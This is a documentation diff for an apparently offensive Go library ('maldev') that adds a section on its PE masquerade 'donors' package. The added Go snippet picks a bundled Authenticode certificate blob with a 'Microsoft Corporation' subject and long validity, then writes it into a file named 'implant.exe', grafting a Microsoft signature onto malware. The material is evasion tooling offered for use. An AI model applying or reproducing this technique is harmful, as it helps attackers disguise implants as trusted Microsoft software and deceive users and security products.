@@ -563,6 +563,34 @@ Bundled IDs (each `<id>.bin` in `pe/masquerade/donors/blobs/`):
 `onedrive`, `svchost`, `taskmgr`, `vscode`. Enumerate at runtime
 via [`donors.AvailableBlobs`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/masquerade/donors#AvailableBlobs).
 
+#### Pick a donor by signer subject — `donors.ParseAll`
+
+[`donors.ParseAll`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/masquerade/donors#ParseAll)
+returns the parsed Authenticode metadata for every bundled blob,
+keyed by ID. Useful when the operator wants "any Microsoft signer"
+rather than committing to a specific donor up-front:
+
+```go
+import (
+    "strings"
+
+    "github.com/oioio-space/maldev/pe/cert"
+    "github.com/oioio-space/maldev/pe/masquerade/donors"
+)
+
+for id, p := range donors.ParseAll() {
+    if strings.Contains(p.Subject, "Microsoft Corporation") &&
+        p.NotAfter.After(time.Now().AddDate(1, 0, 0)) {
+        raw, _ := donors.LoadBlob(id)
+        cert.Write("implant.exe", &cert.Certificate{Raw: raw})
+        break
+    }
+}
+```
+
+[`donors.ParseBlob(id)`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/masquerade/donors#ParseBlob)
+is the single-blob counterpart for the common case.
+
 Unbundled IDs (`cmd`, `notepad`, `sevenzip`, `wt`) — see
 "Why some donors don't have bundled blobs" below.
 
